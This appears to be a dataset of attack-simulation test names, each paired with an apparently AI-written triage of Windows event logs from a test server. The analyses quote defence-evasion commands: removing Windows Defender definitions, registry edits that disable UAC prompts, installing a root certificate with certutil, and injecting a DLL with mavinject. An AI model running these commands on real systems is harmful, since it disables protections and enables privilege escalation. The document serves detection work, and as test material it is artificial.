- Isolate the affected system (Server002) to prevent further compromise.
- Conduct a thorough forensic investigation focusing on the origin of the PowerShell executions and the intentions behind disabling AMSI.
- Review and enhance monitoring to catch similar attempts in the future, especially focusing on PowerShell logging, AMSI bypass attempts, and privilege account usage.
- Evaluate the need for potential incident response involving key stakeholders to mitigate further risks."
UACME Bypass Method 33,"**Detailed Analysis of the Logs:**

After thoroughly analyzing the provided event logs across several categories such as Application, Security, and Sysmon logs, here are the key observations:

**1. Application Logs:**
   - The logs predominantly exhibit routine activities related to system updates and security checks.
   - The Software Protection Platform service log and Windows Defender states indicate normal security protocols.
   - Services related to 'edgeupdate' are starting and stopping frequently, which seems typical for update services.

**2. Security Logs:**
   - EventID 4624, which records successful logon attempts, is associated with the SYSTEM account. This activity is seen multiple times and indicates typical system actions.
   - EventID 4672 indicates a process being granted special privileges, consistent with routine tasks executed by the SYSTEM account.
   - Numerous EventID 5379 logs indicate failed credential accesses, which is often related to normal operating system and application behaviors—note the repetitive nature and association with the SYSTEM and SERVER002$ accounts.
   - EventID 4798 indicates enumeration of local group memberships, executed by 'taskhostw.exe', does not seem to be out of the ordinary given the context of SYSTEM-level operations.

**3. Sysmon Logs:**
   - A notable observation is the frequent execution of scripts and update processors (e.g., MicrosoftEdgeUpdate.exe), which aligns with system updates and application maintenance.
   - The presence of a command: `""C:\Windows\system32\cmd.exe\"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\script\\33 Akagi64.exe""` and execution trace to external files raises a flag. The use of such a script suggests potential misuse of legitimate tools (e.g., LOLBins - Living Off The Land Binaries).
   - The execution of processes like `conhost.exe` and frequent calls involving MicrosoftEdgeUpdate services in numerous instances, while exhaustive, are typical for update routines.
   - The user `SERVER002\admin_test` executed commands that interact with external paths, which could suggest attempts at unauthorized or insecure script execution. The `Akagi64.exe` might refer to a tool involved in bypassing UAC (User Account Control), which is suspicious.

**Assessment:**
   - The logs display a mix of normal system activities along with some potentially suspicious actions involving the execution of scripts and possible misuses of system tools.
   - The frequent use of the SYSTEM account for legitimate operations like Edge updates and compatibility tests is standard.
   - However, the `Akagi64.exe` script execution and specific command-line actions warrant further investigation to rule out any misuse.

**Threats or Risks Identified:**
   - Potential execution of a suspicious script/tool (`Akagi64.exe`) merits deeper inspection.
   - Risk of unauthorized privilege escalation or system exploitation via misuse of legitimate tools.

**Guidance on How to Proceed:**
   - Conduct a comprehensive inspection of the script and its purpose.
   - Validate the integrity and source of `Akagi64.exe` and associated file paths.
   - Review recent user activities for `admin_test` and system integrity involving privilege escalations or unauthorized script executions.

**Resolution:**
- **SUSPICIOUS**: Based on the presence of non-standard script execution involving potential LOLBin techniques, further investigation is needed before concluding any malicious activity definitively."
Disable Windows Security Center Notifications,"After carefully analyzing the provided Sysmon, Application, Security, and System logs, I've documented my observations and findings below:

1. **Sysmon Log Analysis:**
   - The logs show multiple executions of `wevtutil.exe`, which is a legitimate Windows utility often used to manage event logs. This utility was run several times within a short period by the `admin_test` account. While it can be used for legitimate purposes, frequent execution may also be an indicator of an attacker attempting to clear or collect logs.
   - The `cmd.exe` process was executed with the command line argument for adding a registry key: `""cmd.exe"" /c reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f`. This action directly modifies the registry's behavior regarding the Windows Action Center, which could be benign, but it often is a red flag associated with script-based attacks or persistence mechanisms.
   - Following the `cmd.exe` execution, `reg.exe` was executed to make the registry change. The command indicates a registry modification which could be used to alter system behavior, possibly indicating an attempt at persistence or configuration change.
   - Execution of `whoami.exe` to check user information is noted. While this itself is not suspicious, in conjunction with the other activities, it may indicate an attempt to gather system information by a user.
   - Processes were consistently executed with a `High` integrity level, signifying administrative privileges.

2. **Security Log Analysis:**
   - Event ID 4672 logs indicate that the `admin_test` user was granted special privileges such as `SeDebugPrivilege` and `SeBackupPrivilege`, which can allow for powerful operations over system processes—potentially dangerous if improperly used.
   - A login event (4624) and a logoff event (4634) show normal behavior for user `admin_test`, indicating valid authentication activity. However, these messages are in close temporal proximity to the suspicious Sysmon activities.

3. **Additional Observations:**
   - The PowerShell and System logs were not provided, leaving potential gaps in visibility.
   - The Application log entry related to SPP (Software Protection Platform) does not present an immediate concern.

**Assessment:**
The pattern of registry alteration followed by querying for system/user information, and the frequent invocation of utilities to manage logs, suggests attempts at either hiding tracks or preparing the system for another action (like persistence). These activities warrant a more thorough investigation.

**Conclusion:**
The analyzed logs reveal behavior consistent with unauthorized or suspicious activity. The combination of privilege escalation, registry modification, and repeated administrative tool usage points to possible malicious intent. 

**Resolution: SUSPICIOUS**
- Further investigation is needed, including checking for unauthorized access, reviewing registry keys for potential persistence mechanisms, and ensuring that no sensitive data was accessed or altered. Additional logs should be gathered, especially network, PowerShell, and System logs, to gather more context on these activities."
Remove Windows Defender Definition Files,"After thoroughly reviewing the provided log entries across different sources (Application, Sysmon, System, and PowerShell logs), several points need to be considered to assess the situation:

### Application Log
- **Windows Defender State:** The repetitive entries of ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" indicate that the security software is active. This is generally a benign activity and a standard log entry confirming that the security system is operational without directly revealing any threats.

### Sysmon Log
- **Processes and Execution Behavior:**
  - The frequent use of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` is worth investigating. Specifically, `wevtutil.exe` is used to query and back up event logs, which can be both administrative and potentially malicious if used to clear logs.
  - The execution of `cmd.exe` with the command line: `""cmd.exe"" /c ""C:\\Program Files\\Windows Defender\\MpCmdRun.exe"" -RemoveDefinitions -All` is particularly concerning. This command line aims to remove security definitions, potentially disabling protective features of Windows Defender. This operation is suspicious, particularly if unsolicited by IT policies or security operations.

- **Process Execution as ‘admin_test’:** 
  - The administrative user account (SERVER002\\admin_test) involved in these actions could indicate legitimate admin tasks. However, given the command used, it could also signify unauthorized access using this account.

### System Log
- No particularly revealing or security-relevant activity apart from general kernel activities.

### PowerShell Log
- No data provided for assessment from PowerShell activity, which often provides critical insights into execution behavior given its frequent use in both legitimate administration and adversarial actions.

### Security Log
- No relevant entries provided (assumed from the lack of data presented in the shared logs).

### Assessment
- The execution of the command line attempting to remove all Windows Defender definitions (via `MpCmdRun.exe`) is a significant red flag pointing towards possible tampering with security defenses. Given this could either be a severe misconfiguration or unauthorized action with potential malicious intent, this warrants further investigation.

- **User Account Concerns:** The repeated activities linked to the admin_test account suggest reviewing the history and use of this account. Ensuring it has not been compromised or misused is crucial.

### Resolution
Based on the evidence, the resolution for these logs is:
- **SUSPICIOUS**: The logs reveal suspicious activity that requires further investigation, particularly regarding the attempt to remove Windows Defender definitions. Investigations should target confirmation of whether these actions were authorized or are indicative of malicious activity.

### Recommended Actions
1. **User Activity Verification:** Validate the legitimate use of the `admin_test` account. Determine if the session was expected or unauthorized.
2. **Investigate Removal Attempt:** Examine why Windows Defender definitions were being removed. Review any policy changes or logs around this time to capture potential alert triggers.
3. **Logging and Monitoring:** Enhance monitoring around critical system utilities and security tools like Windows Defender to catch attempts to disable or manipulate them.
4. **User and File Access Audits:** Perform routine audits on user accesses and executed processes to identify unfamiliar patterns or anomalies associated with administrative privileges."
Install root CA on Windows with certutil,"After examining the provided Windows event logs, here is a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Powershell Execution**: 
   - Multiple instances of PowerShell execution are found in the logs. The command line `""powershell.exe"" & {certutil -addstore my $env:Temp\rootCA2.cer}` indicates an attempt to add a certificate to the certificate store using PowerShell and CertUtil.
   - This is a known behavior associated with malicious activities, such as certificate impersonation or installation of untrusted certificates in a Trusted Root Certification Authorities store.

2. **Execution of `certutil.exe`**:
   - `CertUtil.exe` is observed executing and adding a certificate with the command `""certutil -addstore my C:\Users\ADMIN_~1\AppData\Local\Temp\rootCA2.cer""`.
   - `CertUtil.exe` is a legitimate Windows utility, but its use in this context and conjunction with PowerShell can suggest certificate-based attacks, obfuscation, or credential theft activities.

3. **Execution of Windows Executables**:
   - `wevtutil.exe` is frequently observed. This tool is used for managing Windows Event logs, and excessive or unauthorized use could imply log clearing or tampering.
   - `whoami.exe` and `hostname.exe` are utilized during the event. While not inherently malicious, they can be used by attackers to gain information about the system environment during an intrusion.

4. **Usage of `conhost.exe`**:
   - Instances of `conhost.exe` are likely expected as part of normal operation when command-line processes are involved, but their frequent appearance suggests their involvement in command execution environments, corroborating the suspicious script execution activities.

### Indicators of Malicious Activity or Compromise:

- The sequence of events demonstrates a pattern often associated with a potential attack vector, especially focusing on PowerShell and command execution concerning the certificate store operations.
- The timeline of activities and the context highlight the use of built-in Windows utilities in a sequence that aligns with obfuscation or preparation for further compromise.

### Threats or Risks Identified:
- Potential unauthorized installation of malicious root certificates, potentially allowing man-in-the-middle attacks or trust abuse within the network.
- Commands executed could facilitate subsequent privilege escalation or data exfiltration in a broader attack campaign.

### Guidance on How to Proceed:
1. **Isolate the Host**: To prevent any further potential malicious actions, isolate the affected system from the network.
2. **Investigate Certificate Store**: Manually verify the presence and validity of the certificate mentioned (`rootCA2.cer`). Remove any unidentified or untrusted certificates.
3. **Conduct Threat Hunting**: Expand the investigation to look for similar patterns on other systems in your environment.
4. **Identify Root Cause**: Examine how these commands were executed (potential vulnerabilities or credential abuse) and patch or harden any weaknesses.
5. **Enhance Monitoring & Logging**: Increase the level and detail of logging around PowerShell execution and credential access to better detect similar activities in the future.

### Resolution:
**MALICIOUS** - The observed behavior clearly indicates malicious activity, intended to manipulate the certificate store and potentially compromise the system's security posture."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"Upon reviewing the provided log entries, I have identified the following observations:

1. **System Logs:**
   - Time synchronization events indicate that the system clock was set back and then forward by svchost.exe, which is legitimate since svchost.exe manages a number of Windows services, including time synchronization tasks. These adjustments were tied to `time.windows.com`, a known legitimate time source.

2. **Security Logs:**
   - There are repeated adjustments to the system time by processes running as `LOCAL SERVICE` or SYSTEM, which could be benign activities related to legitimate system configuration or maintenance tasks.

3. **PowerShell Logs:**
   - The execution of a PowerShell command: `Set-ItemProperty` to modify the `ConsentPromptBehaviorAdmin` registry key to `0`, which disables administrative message prompts. This is a clear indicator of potentially malicious configuration meant to lower system defenses against unauthorized changes.

4. **Sysmon Logs:**
   - Execution of wevtutil.exe by `admin_test` is noted. Wevtutil is used to manage Windows Event logs and could hint at log clearing or manipulation if used in suspicious context, but alone as seen here does not immediately signal malicious intent.

5. **Indicators of Malicious Activity:**
   - The PowerShell logs suggest unauthorized configurations might have occurred. The command used in PowerShell logs to change User Account Control (UAC) settings is suspicious:
     ```powershell
     Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
     ```
     Modifying UAC behavior to minimize prompts is typical of an attacker attempting to reduce obstacles for privilege escalation.

6. **Additional Findings:**
   - Instances of typical system utility usage (e.g., whoami, hostname) under the `admin_test` account could imply reconnaissance activity but are not inherently malicious without other context.
   - The processes launched and managed by legitimate Windows services and Microsoft Edge Update do not present immediate red flags when considered with their contextual time and parameters.

**Assessment:** 

The alteration of the `ConsentPromptBehaviorAdmin` registry setting is a significant concern, pointing to potential attempts to weaken system defenses possibly for privilege escalation. This type of activity could align with initial stages of compromise where an attacker prepares the environment for further exploitation. 

**Resolution:** 
- **SUSPICIOUS** – The PowerShell activity related to changing system protection settings (UAC behavior) raises a flag for potential malicious intent requiring further investigation. 
- **Next Steps:**
  - Investigate the command execution context further, including how and why `admin_test` initiated these changes.
  - Verify the source and authenticity of the PowerShell commands and any associated scripts or scheduled tasks that could cause such activity.
  - Conduct a full security scan and review for any other unauthorized changes or indicators of compromise on this system."
Modify Registry of Current User Profile - cmd,"Upon thorough examination of the provided Windows event logs, the following observations and analyses are derived:

### Suspicious and Anomalous Behavior:

1. **Frequent Execution of System Utilities**:
   - There are multiple instances of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` being executed by the user `SERVER002\\admin_test`. `wevtutil.exe` is used to retrieve information about event logs and `whoami.exe` provides information on the currently logged user—commands that are often run during reconnaissance or information gathering stages of an attack.

2. **Registry Modification**:
   - A `cmd.exe` process is detected executing with command line `cmd.exe /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f`. This command modifies the registry to hide file extensions, which is a common tactic used by malware to prevent users from easily identifying malicious file types.

3. **High Integrity Level**:
   - The processes executed by `SERVER002\\admin_test` are running with a high integrity level, indicative of administrative privileges being used. This heightens the risk as an attacker could leverage these privileges to make system-wide changes.

4. **Process Anomalies**:
   - The continuous spawning of processes `conhost.exe` and `wevtutil.exe` in quick succession is abnormal and should be investigated further. This behavior may indicate an attempt to access or modify system logs or mimic normal activity to avoid detection.

### Indicators of Potential Compromise:

- Although normal administrative actions can include using the mentioned utilities, the combination of rapid, repeated executions and registry modifications is more aligned with malicious activity patterns, particularly those involving privilege escalation or reconnaissance.

### Assessment and Resolution:

Based on the indicators identified and the behavior outlined, the activity recorded in the logs aligns more closely with a suspicious pattern than with normal administrative behavior. The observed modifying of registry keys to potentially hide file extensions and the sequence of utility executions by an admin account provide grounds for concern.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Further Investigation**:
   - Conduct a deeper forensic analysis on the `SERVER002` machine and the `admin_test` account to determine the intent and source of these actions. Check for recent logins and any deviations in expected administrative behaviors.
   
2. **Log Monitoring and Correlation**:
   - Implement continuous monitoring for `wevtutil`, `whoami`, `reg`, and any unusual `cmd.exe` executions to match against known signs of compromise techniques. Look into historical data for patterns.
   
3. **Review Administrative Activities**:
   - Verify the legitimacy of actions performed by `admin_test` to establish if they were intended or if the credentials have been compromised. Consider disabling the account until the investigation is concluded.

4. **Mitigation Steps**:
   - Alert the security operations center and IT teams to be on heightened alert for similar behaviors. Consider deploying more restrictive policies around registry manipulations and access to sensitive system utilities.

5. **User Education and Training**:
   - Enhance security training for users with administrative privileges to recognize and report unusual activities or signs of credential compromise promptly.

Proceeding with these measures will help confirm the nature of these events and mitigate any potential threats effectively."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Upon analyzing the provided Windows event logs, I have identified several noteworthy entries that could indicate suspicious or potentially malicious activity:

1. **Security Log Analysis:**
   - **Event ID 4672** shows the use of advanced privileges (e.g., SeDebugPrivilege) associated with the SYSTEM account. While this could be legitimate, especially on a server, it's important to ensure this was authorized activity.

   - **Event ID 5379** entries show multiple Credential Manager API calls by the user `admin_test`. The `ReturnCode: 3221225567` (STATUS_LOGON_FAILURE) suggests unsuccessful attempts to access credentials, which could be a sign of password spraying or credential harvesting attempts.

2. **PowerShell Log Analysis:**
   - The execution of a PowerShell command involving `svchost.exe` from a temporary directory is extremely suspicious. The command:
     ```
     powershell.exe & {&""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\svchost.exe"" ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.xml"" output.txt}
     ```
     Execution of `svchost.exe` from an unexpected location indicates potentially malicious activity, as `svchost.exe` should only execute from the Windows system directory.

3. **Sysmon Log Analysis:**
   - **Event ID 1** shows a process execution for `svchost.exe` from a location (`C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles`) which is unusual and typically indicative of a malicious file masquerading as a legitimate Windows process.
   
   - The subsequent crash reported in the **Application log** with .NET runtime exceptions (Event ID 1026 and 1000) for this `svchost.exe` reinforces the likelihood of malicious activity. It tried to access a directory that could not be found, a common issue when malware is incorrectly executed or moved.

4. **Application Log Analysis:**
   - The crash logs confirm that the `svchost.exe` from the temp directory resulted in a termination due to an unhandled exception, which is not standard for legitimate `svchost.exe` operations.

5. **Edge Update Activity:**
   - Multiple frequent and quick succession executions of `MicrosoftEdgeUpdate.exe`, while not inherently malicious, should be verified to ensure they match normal update cycles and are not being triggered by an attacker exploiting the updater.

**Assessment and Resolution:**
Considering the combination of unauthorized privilege escalation, unsuccessful credential access attempts, and the execution of suspicious commands via PowerShell with subsequent process crashes, the logs suggest strong indications of potentially malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
1. Immediately isolate the affected host (Server002) to prevent lateral movement or data exfiltration.
2. Conduct a full investigation on the machine to identify the extent of the intrusion.
3. Verify the integrity of systems and data associated with the compromised host.
4. Review user activity, especially for `admin_test`, and verify any unauthorized changes or data access.
5. Consider employing endpoint protection solutions to help detect and prevent similar future attempts.
6. Perform a thorough review and patching of systems to prevent exploitation of known vulnerabilities.
7. Ensure backups are secure and consider restoring from a known good state if compromise extends beyond detection."
Masquerading - non-windows exe running as windows exe,"Based on the provided logs, there are several indicators that suggest potentially malicious activity taking place on the Windows host ""Server002"". Here is a detailed analysis:

### Analysis of Suspicious Activities

1. **PowerShell Activity:**
   - The PowerShell command contained within the logs executes a script that copies an executable (`data.003.exe`) from a temporary directory to another location as `svchost.exe`, starts this process, and then immediately stops it.
   - This behavior can indicate a possible attempt to disguise malware as a legitimate Windows process (`svchost.exe`), which is commonly used by legitimate system processes.

2. **Event 600 - PowerShell Logs:**
   - Multiple logs show the execution of potentially harmful scripts starting with a path from a user's temporary directory, indicating behavior associated with malware attempting to conceal itself within system processes.

3. **Security Log Indicators:**
   - Event ID 4624 indicates a logon activity by the system account (`SYSTEM`) which is a regular behavior in typical situations, but the sequence here aligns with the suspicious PowerShell activity, suggesting it might be related to privilege escalation attempts.
   - Event ID 4672 indicates privilege assignment to accounts with high privileges, which can be a sign of privilege escalation tactics.

4. **Sysmon Logs:**
   - Process creations by `powershell.exe` and executions of binaries from temporary directories is notable. These are associated with timestamps that match the suspicious PowerShell activity, supporting the indication of script-based attacks.
   - The processes involved include `svchost.exe` which was executed abnormally from a temporary directory, not its usual path.
   - Hash values provided for these binaries can aid in identifying known threats by cross-referencing them with threat intelligence databases.

5. **Executable Copy and Rename:**
   - Copying and renaming executable files, seen in this log as moving `data.003.exe` to `svchost.exe`, can indicate attempts at both persistence and disguise, hallmarks of sophisticated malware behavior.

### Assessment and Conclusion
- The activities highlight a pattern observed in common malware deployment strategies, including executing scripts via PowerShell, relocating and renaming suspicious executable files, and operating under trusted process names (svchost.exe).
- This reveals a potential compromise of the system, using techniques that evade detection by blending with regular system operations but performing harmful tasks.

### Resolution - MALICIOUS
Given the observed behavior, the activities logged indicate malware presence and potential compromise. This involves suspicious usage of PowerShell scripts to execute unusual file operations, utilizing system processes for cloaking, and possible privilege escalation actions.

Modify UseTPM Registry entry,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

### Observations:

1. **Edge Update Activities**: 
   - There are numerous entries related to the Microsoft Edge Update process. The logs show legitimate processes such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, `MicrosoftEdgeUpdate.exe`, and other related update tools.
   - The command-line arguments show typical parameters like `/update`, `/ping`, `/regsvc`, `/regserver`, and `/ua /installsource core`. These reflect standard operations for updating Microsoft programs.

2. **System Process Executions**: 
   - The logs listed executions of common system utilities such as `cmd.exe`, `whoami.exe`, and `whoami` with parameters related to file versioning (`Windows\System32\whoami.exe`). These actions are standard for administrative operations or system inquiries.

3. **Registry Modifications**:
   - The log includes an entry where `cmd.exe` was used to execute a registry alteration command involving `HKLM\SOFTWARE\Policies\Microsoft\FVE` to set values related to `UseTPM`. This activity is not immediately malicious but requires context, e.g., if a new security configuration or policy compliance update was installed. Otherwise, unauthorized registry changes can indicate malicious intent.

4. **Permission and User Context**:
   - Processes such as `MicrosoftEdgeUpdate.exe` run under `NT AUTHORITY\SYSTEM`, indicating high privilege levels typically required for system updates.
   - A separate user, `SERVER002\admin_test`, is executing utilities such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, and including registry modifications with elevated privilege levels. This could either reflect security script executions or potentially unauthorized administrative activities.

5. **Service Stoppage**:
   - Logs include service stoppages:
     - `2024-10-24 18:42:18.7667521` and `2024-10-24 18:42:23.3251807` for the ""edgeupdate"" service, usually part of update activities but could need verification against scheduled or approved updates.

6.  **Network Service**:
    - An `sppsvc.exe` process (Software Protection Platform) is running as `NT AUTHORITY\NETWORK SERVICE`, which is standard under networked operations.

### Assessment:

- **Benign Activity**: The majority of entries are related to Microsoft Edge Update processes, handled by Microsoft Corporation's software. These would typically align with scheduled updates, especially given the lack of immediate red flags like mismatched file paths, dubious associated binaries, or foreign connections.
- **Suspicious Activity**: The registry modification executed by `cmd.exe` under `SERVER002\admin_test` might indicate either a system maintenance task or unauthorized configuration changes. The `admin_test` user's execution of system utilities should be verified, as realized during attitude assessment.

### Resolution:

- **SUSPICIOUS**: The logs exhibit predominantly benign behavior associated with software updates. However, the unauthorized registry changes activity stands out as potentially suspicious and necessitates further exploration to correlate it with authorized actions or detect possible misconfigurations or policy violations. Further review of the `admin_test` user activity, permission levels, and login patterns is recommended to rule out misuse or threat actor presence.

### Guidance:

- **Authorized Change Verification**: Investigate whether registry modifications and process executions by the `admin_test` user align with authorized activities.
- **Alert & Monitor**: Set up alerts around sensitive registry manipulation, specifically when executed by non-system accounts or during non-standard hours.
- **Review Update Processes**: Ensure Microsoft Edge update operations are scheduled and validated to align with these observed entries for assurance and alignment with organizational IT policy compliance.
"
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"### Analysis of the Logs

#### PowerShell Log Analysis
- **Command Executed**: The logs show multiple PowerShell executions of the following command:
  ```
  Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
  ```
  - **Purpose**: This command modifies the Windows Registry to change the `PromptOnSecureDesktop` value, which is typically set to `1` to make sure UAC prompts occur on a secure desktop, to `0`. By disabling this, it could allow UAC prompts to appear on the user's regular desktop instead.
  - **Implications**: This can expose the system to potential security risks by allowing malicious software to simulate user input for UAC prompts. Performing such changes, especially without a legitimate reason, is a potential red flag for privilege escalation behavior.

#### Sysmon Log Analysis
- **Processes Observed**: 
  - Frequent execution of `C:\Windows\System32\wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` under the user `SERVER002\admin_test` who has high privileges.
  - Regular activities related to the Microsoft Edge Update service are seen, which is typical but should be checked against known update cycles.
  
- **Notable Behavioral Patterns**:
  - Use of `whoami.exe` and `powershell.exe` involving `Set-ItemProperty` suggests attempts to gather system/user information or change security settings.
  - Continuous use of system utilities, such as `wevtutil`, with high integrity levels suggests administrative privileges and could indicate log querying or modifications for stealth or cleanup actions by an attacker.

#### Application Log Analysis
- **Edge Update Logs**: Repetitive cycles of starting and stopping the Edge Update service, along with various EdgeUpdate processes, which are routine but are spread over a very short interval. This warrants checking EdgeUpdate's update schedule.
- **Software Protection Platform**: Log entries for this service appear normal and related to routine system protection activities.

### Assessment and Conclusion
- **Suspicious Behavior**: The execution of a PowerShell command reducing the security level on User Account Control (UAC) is notably suspicious. This could be part of a larger attack vector aiming at privilege escalation.
- **Regular Updates**: The high frequency of Microsoft Edge-related processes is noted, but better corroborated with the system's update schedule or patch management logs for benign intent verification.

### Resolution
- **Final Resolution: SUSPICIOUS**  
  - There are indicators of potentially risky behavior that require further investigation. Specifically, the modification of UAC prompts and the nature of high-frequency EdgeUpdate activities should be explored further in the context of potential security threats.

### Guidance on Advancing
1. **Investigate the Origin**: Check for any authorized administrative activity logs related to the change in UAC prompt settings.
2. **Validate Scheduled Updates**: Confirm whether the EdgeUpdate activities align with scheduled updates or if there are anomalies.
3. **Review User Controls**: Ensure accounts with administrative rights, such as `admin_test`, are monitored for abnormal activity and verify such changes were expected by the system administrators.
4. **Threat Hunting**: Conduct a deeper hunt for any unusual network or user activity related to the timeframe of these logs."
mavinject - Inject DLL into running process,"After thoroughly analyzing the provided logs, let's highlight the key points and investigate any suspicious behavior:

### Suspicious or Anomalous Behavior:

1. **Powershell Activity:**
   - There is a `powershell.exe` process initiated by user `SERVER002\\admin_test`. While PowerShell is a legitimate tool often used for system administration, it can also be exploited by adversaries for malicious purposes. However, the logs do not provide specifics about command-line arguments used.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` process appears several times in the logs initiated by the same user (`SERVER002\\admin_test`). This utility is used for managing event logs, and while legitimate, can also be utilized maliciously to delete logs, hinder detection, or cover tracks.

3. **DLL Injection:**
   - A suspicious `cmd.exe` process is observed executing the command: `cmd.exe /c mavinject.exe 1000 /INJECTRUNNING`, injecting a DLL named `data.dll` into another process. This behavior is characteristic of a code injection attack, a known technique to execute arbitrary code.

### Indicators of Malicious Activity:

1. **Potential Code Injection:**
   - The use of `mavinject.exe` to inject a DLL is highly suspicious and often associated with malware or advanced persistent threats trying to maintain persistence or execute arbitrary code within a trusted process context.

2. **High Integrity Processes:**
   - Processes executed with `High` integrity level, especially concerning DLL injection activities, suggest potential privilege escalation activities.

3. **Process Execution Pattern:**
   - The sequence of process executions, particularly the repeated use of `conhost.exe` and `wevtutil.exe`, along with the DLL injection into ongoing processes, suggests an attempt to conduct activities stealthily, potentially bypassing user detection.

### Assessment

Given the evidence of potential DLL injection (`mavinject.exe`) alongside suspicious use of `wevtutil.exe` and PowerShell, there are clear indications of potentially malicious activities targeting process manipulation and evasion techniques. These activities necessitate immediate attention.

### Resolution: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent any further propagation or data exfiltration.

2. **Deep Analysis:**
   - Conduct a forensic investigation on the system to collect more information about the injected DLL (`data.dll`) and any other potential malicious payloads.

3. **Review and Monitor:**
   - Analyze historical logs and network traffic for lateral movement or other connected anomalies.

4. **Update Security Measures:**
   - Upgrade endpoint detection and response configurations to catch similar infiltration attempts and block the use of `mavinject.exe` inappropriately.

5. **User Training:**
   - Reinforce user training regarding the execution of suspicious commands or usage of elevated privileges.

By taking these steps, your organization can mitigate the threat, understand the intrusion's depth, and prevent future occurrences."
Add Network Share,"**Analysis of the Logs:**

1. **Time Change Events:**
    - There are several events (Event ID 24 and Event ID 1 from Kernel-General) indicating time adjustments (`NewTime` and `OldTime`). This might suggest legitimate time synchronization, but frequent or strange time changes can sometimes be indicative of attempts to manipulate time-based logs or operations.
    - The Time Service event (Event ID 35 from Microsoft-Windows-Time-Service) indicates synchronization with `time.windows.com`, which is a typical Windows time server used for time synchronization.

2. **Process Activity:**
    - **svchost.exe:** This is a legitimate Windows process used to host services. Multiple entries in both the Security and Sysmon logs show its execution, likely normal system operation.
    - **whoami.exe, conhost.exe, cmd.exe:** These were executed. The use of `cmd.exe` with command line arguments to map network shares (`net use`) and share directories (/REMARK:""test share"") is an operation that could be used maliciously, such as network enumeration or lateral movement.
    - **wevtutil.exe:** Frequently called, often seen in log manipulation activities. If not part of a known maintenance or system task, this could be suspicious.
    - **HOSTNAME.EXE:** Another standard utility to display the hostname of the computer; its presence itself is not suspicious.

3. **Command Line Activity and Script Execution:**
    - The execution of `cmd.exe` with complex commands like `net use` and `net share` suggests exploration of network resources and possibly setting up network shares. This is often seen in the discovery phase of network attacks.

4. **Security Events:**
    - The Security logs (Event ID 4616) capture timezone changes, typically logged when a system event modifies the system time. This corroborates with system time changes seen in the System log.
    - The activity is documented as Event Level 0, which simply audits such significant system changes.

**Conclusion:**
Based on the logs provided, there is no definitive indication of outright malicious activity, but there are signs of potentially suspicious actions, specifically around network share manipulation. The presence of `wevtutil.exe` and unusual network commands could warrant further investigation, especially if these activities were not sanctioned or documented as part of regular administrative tasks.

**Recommendation:**
- **Verification**: Verify if the execution of `wevtutil.exe` and the network commands are authorized. If these actions were not known or approved, it may require closer scrutiny.
- **Network Monitoring**: Monitor for any unauthorized network share access or additional similar behavior that could indicate lateral movement.
- **Further Investigation**: Consult with the administrative users to determine if the activities align with expected maintenance or troubleshooting processes.
- **Audit Trail**: Ensure integrity in time synchronization and audit trails. Verify if any time change manipulations are deliberate and documented.

**Resolution**: **SUSPICIOUS** - The logs contain activity that doesn’t look normal and needs further investigational follow-up to determine intent and legitimacy."
Create Windows Hidden File with Attrib,"Based on the provided Sysmon logs, here is the detailed analysis:

### Analysis of Sysmon Logs:

1. **Process Creation and Execution:**

   - Multiple events involving the execution of `cmd.exe` with different command lines:
     - Checking the existence of a file in the TEMP directory (e.g., `IF EXIST %temp%\\data.001.txt`).
     - Creating or modifying files by echoing content into `%temp%\\data.001.txt`.
     - Executing `attrib.exe` to change attributes of a file (e.g., making it hidden).

   - Several `conhost.exe` processes spawn with command lines related to these `cmd.exe` executions, seemingly as part of standard Windows console operations.

   - The `wsmprovhost.exe` process (indicating a likely Windows Management Instrumentation operation) acts as a parent to several `cmd.exe` processes, suggesting scripted or automated operations, potentially as part of administrative tasks.

2. **Suspicious Indicators:**
   
   - The repeated execution of `cmd.exe` to manipulate files in the TEMP directory with specific focus on `data.001.txt`, including creation, content modification, and attribute changes, can be regarded as suspicious but is not necessarily malicious without additional context. This could be part of legitimate operations or scripting done by an admin user.

   - The presence of PowerShell activity is noted but not detailed in the logs provided.

3. **Wevtutil Execution:**
   
   - Execution of `wevtutil.exe`, a command-line utility used to manage Windows Event logs, which could imply someone is clearing or manipulating event logs to hide activity. However, without corresponding context, this action is not immediately malicious but is worth further examination.

4. **Microsoft Edge Update Activity:**

   - Multiple entries related to Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe` and related components like `MicrosoftEdgeUpdateComRegisterShell64.exe`). These generally appear to be legitimate update activities by Edge, evidenced by expected command lines and being executed by `NT AUTHORITY\SYSTEM`. This surge of Edge update-related activity is not unusual on its own.
   
5. **Network Service Processes:**

   - The execution of typical Windows services such as `sppsvc.exe` (Software Protection Platform Service) and `WmiPrvSE.exe` (WMI Provider Host) under `NT AUTHORITY\NETWORK SERVICE` is normal for system operations.

### Conclusion and Recommendation:

**Resolution: SUSPICIOUS**

